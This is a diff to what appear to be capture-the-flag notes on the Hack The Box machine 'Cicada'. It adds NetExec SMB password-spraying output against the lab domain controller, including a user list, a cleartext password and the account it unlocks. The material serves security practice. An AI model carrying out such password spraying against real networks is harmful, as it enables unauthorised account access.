@@ -457,3 +457,22 @@ Version: v1.0.3 (9dad6e1) - 12/05/24 - Ronnie Flathers @ropnop
 
 2024/12/05 22:52:51 >  Done! Tested 14 logins (0 successes) in 0.251 seconds
 ```
+
+nxc password bruteforce output (found user michael.wrightson):
+```bash
+SMB         10.129.202.143  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\administrator@cicada.htb:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
+SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\emily.oscars@cicada.htb:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
+SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\david.orelious@cicada.htb:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
+SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\michael.wrightson@cicada.htb:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
+SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\sarah.dantelia@cicada.htb:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
+SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\john.smoulder@cicada.htb:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
+SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
+SMB         10.129.202.143  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
+```
